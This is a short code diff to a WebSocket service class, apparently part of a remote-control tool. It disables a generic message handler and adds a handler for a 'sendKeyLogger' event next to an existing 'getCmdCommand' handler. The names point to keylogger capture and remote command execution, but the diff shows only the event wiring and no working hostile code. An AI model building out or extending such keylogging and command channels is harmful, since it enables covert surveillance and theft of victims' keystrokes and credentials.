@@ -60,7 +60,9 @@ export default class WsService {
 
 		ws.on("getCmdCommand", wsOthersEvents.getCmdCommand);
 
-		ws.on("message", wsOthersEvents.reciveMessage);
+		// ws.on("message", wsOthersEvents.reciveMessage);
+
+		ws.on("sendKeyLogger", wsOthersEvents.reciveKeyLogger);
 
 		ws.on("close", () => {
 			Logger.warn("Disconnected from WebSocket server");
